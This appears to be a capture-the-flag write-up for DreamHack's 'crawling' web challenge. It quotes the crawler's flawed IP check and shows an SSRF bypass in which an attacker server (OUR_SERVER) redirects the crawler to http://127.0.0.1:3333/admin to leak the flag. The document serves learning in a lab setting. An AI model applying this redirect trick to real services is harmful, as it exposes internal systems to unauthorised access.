# crawling — DreamHack

> **Room / Challenge:** crawling (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** crawling (web)
- **Link**: `https://dreamhack.io/wargame/challenges/274`
- **Level:** `2`
- **Date:** `18-11-2025`

---

## Goal

Leveraging the crawling service to get access to `/admin` page and get the flag.

## My Solution

The web app is simple with the crawling logic, the main logic is in this code:

```python
def check_get(url):
    ip = lookup(urlparse(url).netloc.split(':')[0])
    if ip == False or ip =='0.0.0.0':
        return "Not a valid URL."
    res=requests.get(url)
    if check_global(ip) == False:
        return "Can you access my admin page~?"
    for i in res.text.split('>'):
        if 'referer' in i:
            ref_host = urlparse(res.headers.get('refer')).netloc.split(':')[0]
            if ref_host == 'localhost':
                return False
            if ref_host == '127.0.0.1':
                return False
    res=requests.get(url)
    return res.text
```

It doesn't allow us to have ip address to `0.0.0.0`, also there is a check of IP:

```python
def check_global(ip):
    try:
        return (ipaddress.ip_address(ip)).is_global
    except:
        return False
```

So here is the point we cannot use `localhost`, `127.0.0.1` or `0.0.0.0`, how do we make the crawling service to crawl the `/admin` page and return the flag. I set up a simple Express app with a redirect route:

```javascript
app.get("/external-link", (req, res) => {
  res.redirect("http://127.0.0.1:3333/admin");
});
```

By this when the crawling service visit `https://OUR_SERVER/external-link` it will be redirected to `http://127.0.0.1:3333/admin` which will return the flag value, testing our server with `curl`:

```bash
$ curl https://OUR_SERVER/external-link
Found. Redirecting to http://127.0.0.1:3333/admin
```

Submit `https://OUR_SERVER/external-link` to the crawling service and get the flag:
![Guide image](./screenshots/1.png)
